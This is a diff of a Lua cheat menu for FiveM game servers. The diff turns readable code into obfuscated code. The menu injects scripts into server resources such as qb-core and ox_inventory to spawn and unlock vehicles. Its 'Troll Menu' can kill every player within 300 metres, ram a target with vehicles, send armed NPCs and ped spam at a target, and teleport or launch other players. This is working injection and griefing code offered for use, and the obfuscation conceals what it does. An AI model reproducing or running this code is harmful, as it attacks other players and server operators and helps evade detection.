(GetResourceState("qb-core")=="started") then v307="qb-core";else v307="ox_inventory";end MachoInjectResource2(NewThreadNs,v307,[[
         -- Spawn a random car with keys
         local carModels = {
             "sultan", "adder", "zentorno", "t20", "nero", 
@@ -2132,27 +352,7 @@ MachoMenuButton(VehicleSection, "Spawn Car with Keys", function()
             
             SetModelAsNoLongerNeeded(modelHash)
         end
-    ]])
-    
-    MachoMenuNotification("Vehicle", "Spawning random car with keys...")
-end)
-
--- Spawn Specific Car with Keys (with input)
-local VehicleSpawnInput = MachoMenuInputbox(VehicleSection, "Vehicle Model", "e.g., sultan")
-MachoMenuButton(VehicleSection, "Spawn Specific Car with Keys", function()
-    local modelName = MachoMenuGetInputbox(VehicleSpawnInput)
-    
-    if modelName and modelName ~= '' then
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]]);MachoMenuNotification("Vehicle","Spawning random car with keys...");end);local v82=MachoMenuInputbox(v74,"Vehicle Model","e.g., sultan");MachoMenuButton(v74,"Spawn Specific Car with Keys",function() local v308=MachoMenuGetInputbox(v82);if (v308 and (v308~="")) then local v539=nil;if (GetResourceState("monitor")=="started") then v539="monitor";elseif (GetResourceState("qb-core")=="started") then v539="qb-core";else v539="ox_inventory";end MachoInjectResource2(NewThreadNs,v539,string.format([[
             local modelName = "%s"
             local modelHash = GetHashKey(modelName)
             
@@ -2191,54 +391,7 @@ MachoMenuButton(VehicleSection, "Spawn Specific Car with Keys", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'Invalid model: ' .. modelName } })
             end
-        ]], modelName))
-        
-        MachoMenuNotification("Vehicle", "Spawning " .. modelName .. " with keys...")
-    else
-        MachoMenuNotification("Error", "Please enter a vehicle model!")
-    end
-end)
-
--- Simple version (if you already have a spawn function)
-MachoMenuButton(VehicleSection, "Spawn Car with Keys (Simple)", function()
-    local playerPed = PlayerPedId()
-    local coords = GetEntityCoords(playerPed)
-    local modelHash = GetHashKey("sultan")
-    
-    RequestModel(modelHash)
-    while not HasModelLoaded(modelHash) do
-        Citizen.Wait(0)
-    end
-    
-    local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(playerPed), true, false)
-    
-    if DoesEntityExist(vehicle) then
-        SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
-        SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
-        SetVehicleEngineOn(vehicle, true, true, false)
-        SetVehicleDoorsLocked(vehicle, 1)
-        
-        -- Give keys
-        local plate = GetVehicleNumberPlateText(vehicle)
-        TriggerEvent('vehiclekeys:client:SetOwner', plate)
-        
-        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
-        MachoMenuNotification("Vehicle", "Spawned Sultan with keys!")
-    end
-    
-    SetModelAsNoLongerNeeded(modelHash)
-end)
-
--- ============================================================
--- VEHICLE FEATURES (Add to VehicleSection or New Tab)
--- ============================================================
-
--- Set License Plate
-local PlateInput = MachoMenuInputbox(VehicleSection, "License Plate", "e.g., 34AKP952")
-MachoMenuButton(VehicleSection, "Set License Plate", function()
-    local plate = MachoMenuGetInputbox(PlateInput)
-    if plate and plate ~= '' then
-        MachoInjectResource2(NewThreadNs, 'monitor', string.format([[
+        ]],v308));MachoMenuNotification("Vehicle","Spawning "   .. v308   .. " with keys..." );else MachoMenuNotification("Error","Please enter a vehicle model!");end end);MachoMenuButton(v74,"Spawn Car with Keys (Simple)",function() local v309=PlayerPedId();local v310=GetEntityCoords(v309);local v311=GetHashKey("sultan");RequestModel(v311);while  not HasModelLoaded(v311) do Citizen.Wait(0);end local v312=CreateVehicle(v311,v310.x,v310.y,v310.z,GetEntityHeading(v309),true,false);if DoesEntityExist(v312) then local v540=609 -(295 + 314) ;local v541;while true do if ((2 -1)==v540) then SetVehicleEngineOn(v312,true,true,false);SetVehicleDoorsLocked(v312,1);v540=1964 -(1300 + 662) ;end if (0==v540) then SetVehicleCustomPrimaryColour(v312,255,255,800 -545 );SetVehicleCustomSecondaryColour(v312,255,2010 -(1178 + 577) ,133 + 122 );v540=2 -1 ;end if (v540==(1407 -(851 + 554))) then v541=GetVehicleNumberPlateText(v312);TriggerEvent("vehiclekeys:client:SetOwner",v541);v540=3 + 0 ;end if (v540==(8 -5)) then TaskWarpPedIntoVehicle(v309,v312, -(1 -0));MachoMenuNotification("Vehicle","Spawned Sultan with keys!");break;end end end SetModelAsNoLongerNeeded(v311);end);local v83=MachoMenuInputbox(v74,"License Plate","e.g., 34AKP952");MachoMenuButton(v74,"Set License Plate",function() local v313=MachoMenuGetInputbox(v83);if (v313 and (v313~="")) then MachoInjectResource2(NewThreadNs,"monitor",string.format([[
             local ped = PlayerPedId()
             local veh = GetVehiclePedIsIn(ped, false)
             if veh and veh ~= 0 then
@@ -2248,16 +401,7 @@ MachoMenuButton(VehicleSection, "Set License Plate", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
             end
-        ]], plate, plate, plate))
-        MachoMenuNotification("Vehicle", "License plate set to: " .. plate)
-    else
-        MachoMenuNotification("Error", "Please enter a plate number!")
-    end
-end)
-
--- Repair Vehicle
-MachoMenuButton(VehicleSection, "Repair Vehicle", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+        ]],v313,v313,v313));MachoMenuNotification("Vehicle","License plate set to: "   .. v313 );else MachoMenuNotification("Error","Please enter a plate number!");end end);MachoMenuButton(v74,"Repair Vehicle",function() local v314=302 -(115 + 187) ;while true do if (v314==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local vehicle = GetVehiclePedIsIn(ped, false)
         
@@ -2274,13 +418,7 @@ MachoMenuButton(VehicleSection, "Repair Vehicle", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Vehicle repaired!")
-end)
-
--- Clean Vehicle
-MachoMenuButton(VehicleSection, "Clean Vehicle", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Vehicle repaired!");break;end end end);MachoMenuButton(v74,"Clean Vehicle",function() local v315=0 + 0 ;while true do if ((0 -0)==v315) then MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local veh = GetVehiclePedIsIn(ped, false)
         if veh and veh ~= 0 then
@@ -2289,13 +427,7 @@ MachoMenuButton(VehicleSection, "Clean Vehicle", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Vehicle cleaned!")
-end)
-
--- Force Engine
-MachoMenuButton(VehicleSection, "Force Engine", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Vehicle cleaned!");break;end end end);MachoMenuButton(v74,"Force Engine",function() local v316=1161 -(160 + 1001) ;while true do if (v316==(0 + 0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local veh = GetVehiclePedIsIn(ped, false)
         if veh and veh ~= 0 then
@@ -2309,13 +441,7 @@ MachoMenuButton(VehicleSection, "Force Engine", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Engine forced on!")
-end)
-
--- Max Upgrade
-MachoMenuButton(VehicleSection, "Max Upgrade", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Engine forced on!");break;end end end);MachoMenuButton(v74,"Max Upgrade",function() local v317=0 + 0 ;while true do if (v317==(0 -0)) then MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local veh = GetVehiclePedIsIn(ped, false)
         
@@ -2362,13 +488,7 @@ MachoMenuButton(VehicleSection, "Max Upgrade", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Vehicle max upgraded!")
-end)
-
--- Delete Vehicle
-MachoMenuButton(VehicleSection, "Delete Vehicle", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Vehicle max upgraded!");break;end end end);MachoMenuButton(v74,"Delete Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local veh = GetVehiclePedIsIn(ped, false)
         
@@ -2389,13 +509,7 @@ MachoMenuButton(VehicleSection, "Delete Vehicle", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'You are not in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Deleting vehicle...")
-end)
-
--- Unlock Closest Vehicle
-MachoMenuButton(VehicleSection, "Unlock Closest Vehicle", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Deleting vehicle...");end);MachoMenuButton(v74,"Unlock Closest Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local coords = GetEntityCoords(ped)
         local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
@@ -2409,13 +523,7 @@ MachoMenuButton(VehicleSection, "Unlock Closest Vehicle", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Unlocking closest vehicle...")
-end)
-
--- Teleport into Closest Vehicle
-MachoMenuButton(VehicleSection, "TP into Closest Vehicle", function()
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Unlocking closest vehicle...");end);MachoMenuButton(v74,"TP into Closest Vehicle",function() MachoInjectResource2(NewThreadNs,"monitor",[[
         local ped = PlayerPedId()
         local coords = GetEntityCoords(ped)
         local veh = GetClosestVehicle(coords.x, coords.y, coords.z, 15.0, 0, 70)
@@ -2430,19 +538,7 @@ MachoMenuButton(VehicleSection, "TP into Closest Vehicle", function()
         else
             TriggerEvent('chat:addMessage', { args = { '^1Vehicle:', 'No vehicle found nearby or you are already in a vehicle!' } })
         end
-    ]])
-    MachoMenuNotification("Vehicle", "Teleporting into closest vehicle...")
-end)
-
--- ============================================================
--- VEHICLE TOGGLES (Checkboxes)
--- ============================================================
-
--- Boost Vehicle
-local boostActive = false
-MachoMenuCheckbox(VehicleSection, "Boost Vehicle", function()
-    boostActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Vehicle","Teleporting into closest vehicle...");end);local v84=false;MachoMenuCheckbox(v74,"Boost Vehicle",function() v84=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.boostThreadRunning then
             _G.boostThreadRunning = true
             _G.boostEnabled = true
@@ -2467,22 +563,10 @@ MachoMenuCheckbox(VehicleSection, "Boost Vehicle", function()
             end)
         end
         _G.boostEnabled = true
-    ]])
-    MachoMenuNotification("Boost", "Boost Vehicle ON (Hold Shift)")
-end, function()
-    boostActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Boost","Boost Vehicle ON (Hold Shift)");end,function() v84=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         _G.boostEnabled = false
         _G.boostThreadRunning = false
-    ]])
-    MachoMenuNotification("Boost", "Boost Vehicle OFF")
-end)
-
--- Instant Brakes
-local instantBrakesActive = false
-MachoMenuCheckbox(VehicleSection, "Instant Brakes", function()
-    instantBrakesActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Boost","Boost Vehicle OFF");end);local v85=false;MachoMenuCheckbox(v74,"Instant Brakes",function() v85=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.brakesThreadRunning then
             _G.brakesThreadRunning = true
             _G.brakesEnabled = true
@@ -2505,22 +589,10 @@ MachoMenuCheckbox(VehicleSection, "Instant Brakes", function()
             end)
         end
         _G.brakesEnabled = true
-    ]])
-    MachoMenuNotification("Brakes", "Instant Brakes ON (Hold S)")
-end, function()
-    instantBrakesActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Brakes","Instant Brakes ON (Hold S)");end,function() v85=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         _G.brakesEnabled = false
         _G.brakesThreadRunning = false
-    ]])
-    MachoMenuNotification("Brakes", "Instant Brakes OFF")
-end)
-
--- Easy Handling
-local easyHandlingActive = false
-MachoMenuCheckbox(VehicleSection, "Easy Handling", function()
-    easyHandlingActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Brakes","Instant Brakes OFF");end);local v86=false;MachoMenuCheckbox(v74,"Easy Handling",function() v86=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.handlingThreadRunning then
             _G.handlingThreadRunning = true
             _G.handlingEnabled = true
@@ -2544,11 +616,7 @@ MachoMenuCheckbox(VehicleSection, "Easy Handling", function()
             end)
         end
         _G.handlingEnabled = true
-    ]])
-    MachoMenuNotification("Handling", "Easy Handling ON")
-end, function()
-    easyHandlingActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Handling","Easy Handling ON");end,function() local v318=358 -(237 + 121) ;while true do if (v318==(898 -(525 + 372))) then MachoMenuNotification("Handling","Easy Handling OFF");break;end if ((0 -0)==v318) then v86=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         _G.handlingEnabled = false
         _G.handlingThreadRunning = false
         local ped = PlayerPedId()
@@ -2557,15 +625,7 @@ end, function()
             SetVehicleGravityAmount(veh, 9.8)
             SetVehicleStrong(veh, false)
         end
-    ]])
-    MachoMenuNotification("Handling", "Easy Handling OFF")
-end)
-
--- Rainbow Vehicle
-local rainbowActive = false
-MachoMenuCheckbox(VehicleSection, "Rainbow Vehicle", function()
-    rainbowActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);v318=1;end end end);local v87=false;MachoMenuCheckbox(v74,"Rainbow Vehicle",function() v87=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.rainbowThreadRunning then
             _G.rainbowThreadRunning = true
             _G.rainbowEnabled = true
@@ -2594,11 +654,7 @@ MachoMenuCheckbox(VehicleSection, "Rainbow Vehicle", function()
             end)
         end
         _G.rainbowEnabled = true
-    ]])
-    MachoMenuNotification("Rainbow", "Rainbow Vehicle ON")
-end, function()
-    rainbowActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Rainbow","Rainbow Vehicle ON");end,function() v87=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         _G.rainbowEnabled = false
         _G.rainbowThreadRunning = false
         local ped = PlayerPedId()
@@ -2607,15 +663,7 @@ end, function()
             SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
             SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
         end
-    ]])
-    MachoMenuNotification("Rainbow", "Rainbow Vehicle OFF")
-end)
-
--- Unlimited Fuel
-local unlimitedFuelActive = false
-MachoMenuCheckbox(VehicleSection, "Unlimited Fuel", function()
-    unlimitedFuelActive = true
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Rainbow","Rainbow Vehicle OFF");end);local v88=false;MachoMenuCheckbox(v74,"Unlimited Fuel",function() v88=true;MachoInjectResource2(NewThreadNs,"monitor",[[
         if not _G.fuelThreadRunning then
             _G.fuelThreadRunning = true
             _G.fuelEnabled = true
@@ -2640,51 +688,10 @@ MachoMenuCheckbox(VehicleSection, "Unlimited Fuel", function()
             end)
         end
         _G.fuelEnabled = true
-    ]])
-    MachoMenuNotification("Fuel", "Unlimited Fuel ON")
-end, function()
-    unlimitedFuelActive = false
-    MachoInjectResource2(NewThreadNs, 'monitor', [[
+    ]]);MachoMenuNotification("Fuel","Unlimited Fuel ON");end,function() v88=false;MachoInjectResource2(NewThreadNs,"monitor",[[
         _G.fuelEnabled = false
         _G.fuelThreadRunning = false
-    ]])
-    MachoMenuNotification("Fuel", "Unlimited Fuel OFF")
-end)
-
--- Tab: Troll Menu
-local TrollTab = MachoMenuAddTab(MenuWindow, "Troll Menu")
-
--- Group 1: Vehicle and NPC Features
-local VehicleNPCSection = MachoMenuGroup(
-    TrollTab,
-    "Vehicle and NPC Features",
-    420,              -- X position (fixed)
-    9,               -- Y position
-    710,             -- Width (increased)
-    MenuSize.y - 10
-)
-
--- Group 2: Player Manipulation
-local PlayerManipSection = MachoMenuGroup(
-    TrollTab,
-    "Player Manipulation",
-    155,             -- X position (FirstSection + width + space)
-    9,               -- Y position
-    420,             -- Width (same structure)
-    MenuSize.y - 10
-)
-
--- Title: Vehicle Ram
-MachoMenuText(VehicleNPCSection, "Vehicle Ram")
-
--- Player ID text input (Vehicle Ram)
-local PlayerIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Target Player ID (Vehicle Ram)", "e.g., 123")
-
--- Ram Player button
-MachoMenuButton(VehicleNPCSection, "Launch Vehicle at Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(PlayerIdInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoInjectResource('monitor', string.format([[
+    ]]);MachoMenuNotification("Fuel","Unlimited Fuel OFF");end);local v89=MachoMenuAddTab(v4,"Troll Menu");local v90=MachoMenuGroup(v89,"Vehicle and NPC Features",1379 -959 ,151 -(96 + 46) ,710,v1.y-(787 -(643 + 134)) );local v91=MachoMenuGroup(v89,"Player Manipulation",56 + 99 ,9,1007 -587 ,v1.y-10 );MachoMenuText(v90,"Vehicle Ram");local v92=MachoMenuInputbox(v90,"Target Player ID (Vehicle Ram)","e.g., 123");MachoMenuButton(v90,"Launch Vehicle at Player",function() local v319=tonumber(MachoMenuGetInputbox(v92));if (v319 and (v319>(0 -0))) then MachoInjectResource("monitor",string.format([[
             local playerId = GetPlayerFromServerId(%d)
             if playerId then
                 local targetPed = GetPlayerPed(playerId)
@@ -2706,32 +713,7 @@ MachoMenuButton(VehicleNPCSection, "Launch Vehicle at Player", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Player not found! ID: %d' } })
             end
-        ]], targetId, targetId, targetId))
-        MachoMenuNotification("Vehicle System", "Vehicle launch initiated! Target ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- ============================================================
--- KILL EVERYONE NEARBY (300 meters)
--- ============================================================
-
-MachoMenuButton(PlayerManipSection, "Kill Everyone Nearby (300m)", function()
-    MachoMenuNotification("Kill All", "Killing all players within 300 meters...")
-    
-    local targetResource = nil
-    if GetResourceState('vrp') == "started" then
-        targetResource = 'vrp'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    elseif GetResourceState('es_extended') == "started" then
-        targetResource = 'es_extended'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+        ]],v319,v319,v319));MachoMenuNotification("Vehicle System","Vehicle launch initiated! Target ID: "   .. v319 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v91,"Kill Everyone Nearby (300m)",function() MachoMenuNotification("Kill All","Killing all players within 300 meters...");local v320=nil;if (GetResourceState("vrp")=="started") then v320="vrp";elseif (GetResourceState("qb-core")=="started") then v320="qb-core";elseif (GetResourceState("es_extended")=="started") then v320="es_extended";else v320="ox_inventory";end MachoInjectResource2(NewThreadNs,v320,[[
         local myPed = PlayerPedId()
         local myCoords = GetEntityCoords(myPed)
         local weaponHash = GetHashKey("WEAPON_PISTOL50")
@@ -2783,28 +765,7 @@ MachoMenuButton(PlayerManipSection, "Kill Everyone Nearby (300m)", function()
         
         MachoMenuNotification("Kill All", "Killed " .. killed .. " players within 300m")
         print("Kill All: Killed " .. killed .. " players")
-    ]])
-end)
-
--- Title: NPC Spawn
-MachoMenuText(VehicleNPCSection, "NPC Attack")
-
--- Player ID text input (NPC Spawn)
-local NpcTargetIdInputBoxHandle = MachoMenuInputbox(VehicleNPCSection, "Target Player ID (NPC)", "e.g., 123")
-
--- NPC Spawn button
-MachoMenuButton(VehicleNPCSection, "Start NPCs", function()
-    local targetId = tonumber(MachoMenuGetInputbox(NpcTargetIdInputBoxHandle))
-    if targetId and targetId > 0 then
-        if isSpawning then
-            MachoMenuNotification("Error", "NPCs are already spawning! Stop them first.")
-            return
-        end
-        isSpawning = true
-        MachoMenuNotification("NPC System", "NPC spawn initiated! Target ID: " .. targetId)
-        Citizen.CreateThread(function()
-            while isSpawning do
-                MachoInjectResource('monitor', string.format([[
+    ]]);end);MachoMenuText(v90,"NPC Attack");local v93=MachoMenuInputbox(v90,"Target Player ID (NPC)","e.g., 123");MachoMenuButton(v90,"Start NPCs",function() local v321=tonumber(MachoMenuGetInputbox(v93));if (v321 and (v321>(0 + 0))) then local v542=0 -0 ;while true do if (v542==(0 -0)) then if isSpawning then local v928=719 -(316 + 403) ;while true do if (v928==0) then MachoMenuNotification("Error","NPCs are already spawning! Stop them first.");return;end end end isSpawning=true;v542=1 + 0 ;end if (v542==1) then MachoMenuNotification("NPC System","NPC spawn initiated! Target ID: "   .. v321 );Citizen.CreateThread(function() while isSpawning do MachoInjectResource("monitor",string.format([[
                     local npcModel = "a_m_m_acult_01"
                     local weaponHash = "weapon_rayminigun"
                     local radius = 5.0
@@ -2832,50 +793,7 @@ MachoMenuButton(VehicleNPCSection, "Start NPCs", function()
                         TaskCombatPed(npc, playerPed, 0, 16)
                         SetEntityAsNoLongerNeeded(npc)
                     end
-                ]], targetId, targetId))
-                Wait(2000) -- Spawn ped every 2 seconds
-            end
-        end)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Stop NPC Spawn button
-MachoMenuButton(VehicleNPCSection, "Stop NPCs", function()
-    if isSpawning then
-        isSpawning = false
-        MachoMenuNotification("NPC System", "NPC spawn stopped!")
-    else
-        MachoMenuNotification("Info", "NPC spawn is already stopped.")
-    end
-end)
-
--- NPC Spam Feature
-MachoMenuText(VehicleNPCSection, "NPC Spam")
--- NPC Spam Exploit Control
-local pedSpawningExploit = false
-local pedModelExploit = "mp_m_freemode_01"
-
--- Player ID input box (NPC Spam)
-local PedTargetInputBox = MachoMenuInputbox(VehicleNPCSection, "NPC Spam Target ID", "e.g., 123")
-
--- START PED SPAM BUTTON
-MachoMenuButton(VehicleNPCSection, "Start Ped Spam - Exploit", function()
-    if pedSpawningExploit then
-        MachoMenuNotification("Error", "Already started. Stop it first.")
-        return
-    end
-
-    local targetId = tonumber(MachoMenuGetInputbox(PedTargetInputBox))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-        return
-    end
-
-    pedSpawningExploit = true
-
-    MachoInjectResource('monitor', string.format([[
+                ]],v321,v321));Wait(2000);end end);break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);MachoMenuButton(v90,"Stop NPCs",function() if isSpawning then isSpawning=false;MachoMenuNotification("NPC System","NPC spawn stopped!");else MachoMenuNotification("Info","NPC spawn is already stopped.");end end);MachoMenuText(v90,"NPC Spam");local v94=false;local v95="mp_m_freemode_01";local v96=MachoMenuInputbox(v90,"NPC Spam Target ID","e.g., 123");MachoMenuButton(v90,"Start Ped Spam - Exploit",function() if v94 then local v543=0 -0 ;while true do if (v543==0) then MachoMenuNotification("Error","Already started. Stop it first.");return;end end end local v322=tonumber(MachoMenuGetInputbox(v96));if ( not v322 or (v322<=(0 + 0))) then local v544=0;while true do if (v544==0) then MachoMenuNotification("Error","Please enter a valid player ID!");return;end end end v94=true;MachoInjectResource("monitor",string.format([[
         local pedModel = "%s"
         local pedSpawning = true
         local targetId = %d
@@ -2905,39 +823,9 @@ MachoMenuButton(VehicleNPCSection, "Start Ped Spam - Exploit", function()
         RegisterNetEvent("stopPedSpamExploit", function()
             pedSpawning = false
         end)
-    ]], pedModelExploit, targetId))
-
-    MachoMenuNotification("NPC System", "Ped spam started! Target ID: " .. targetId)
-end)
-
--- STOP PED SPAM BUTTON
-MachoMenuButton(VehicleNPCSection, "Stop Ped Spam", function()
-    if not pedSpawningExploit then
-        MachoMenuNotification("Info", "Already stopped.")
-        return
-    end
-
-    pedSpawningExploit = false
-
-    MachoInjectResource('monitor', [[
+    ]],v95,v322));MachoMenuNotification("NPC System","Ped spam started! Target ID: "   .. v322 );end);MachoMenuButton(v90,"Stop Ped Spam",function() local v323=0 -0 ;while true do if (v323==(0 + 0)) then if  not v94 then local v822=0 + 0 ;while true do if ((0 -0)==v822) then MachoMenuNotification("Info","Already stopped.");return;end end end v94=false;v323=4 -3 ;end if (v323==(1 -0)) then MachoInjectResource("monitor",[[
         TriggerEvent("stopPedSpamExploit")
-    ]])
-
-    MachoMenuNotification("NPC System", "Ped spam stopped!")
-end)
-
--- Title: Player Manipulation
-MachoMenuText(PlayerManipSection, "Player Manipulation")
-
--- Bring to Self (Auto bring and drop - No G key needed)
-local BringTargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Bring)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Bring to Self", function()
-    local targetId = tonumber(MachoMenuGetInputbox(BringTargetIdInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Bring", "Bringing player ID: " .. targetId)
-        
-        MachoInjectResource('monitor', string.format([[
+    ]]);MachoMenuNotification("NPC System","Ped spam stopped!");break;end end end);MachoMenuText(v91,"Player Manipulation");local v97=MachoMenuInputbox(v91,"Target Player ID (Bring)","e.g., 123");MachoMenuButton(v91,"Bring to Self",function() local v324=tonumber(MachoMenuGetInputbox(v97));if (v324 and (v324>(0 + 0))) then MachoMenuNotification("Bring","Bringing player ID: "   .. v324 );MachoInjectResource("monitor",string.format([[
             local playerPed = PlayerPedId()
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
@@ -2979,32 +867,7 @@ MachoMenuButton(PlayerManipSection, "Bring to Self", function()
             else
                 TriggerEvent('chat:addMessage', { args = { '^1Bring:', 'Player not found! ID: ' .. targetServerId } })
             end
-        ]], targetId))
-        
-        MachoMenuNotification("Bring", "Player brought to you!")
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Launch Player
-local LaunchPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Launch)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Launch Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(LaunchPlayerInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Launch", "Launching player ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v324));MachoMenuNotification("Bring","Player brought to you!");else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v98=MachoMenuInputbox(v91,"Target Player ID (Launch)","e.g., 123");MachoMenuButton(v91,"Launch Player",function() local v325=tonumber(MachoMenuGetInputbox(v98));if (v325 and (v325>0)) then MachoMenuNotification("Launch","Launching player ID: "   .. v325 );local v545=nil;if (GetResourceState("monitor")=="started") then v545="monitor";elseif (GetResourceState("qb-core")=="started") then v545="qb-core";else v545="ox_inventory";end MachoInjectResource2(NewThreadNs,v545,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3077,31 +940,7 @@ MachoMenuButton(PlayerManipSection, "Launch Player", function()
             local targetName = GetPlayerName(targetPlayer)
             print("Launch: Launched " .. targetName)
             TriggerEvent('chat:addMessage', { args = { '^2Launch:', 'Launched ' .. targetName .. ' (ID: %d)' } })
-        ]], targetId, targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
-
--- Teleport to Ocean
-local OceanInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (To Ocean)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Teleport to Ocean", function()
-    local targetId = tonumber(MachoMenuGetInputbox(OceanInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Ocean", "Sending player ID: " .. targetId .. " to ocean")
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'ox_inventory'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
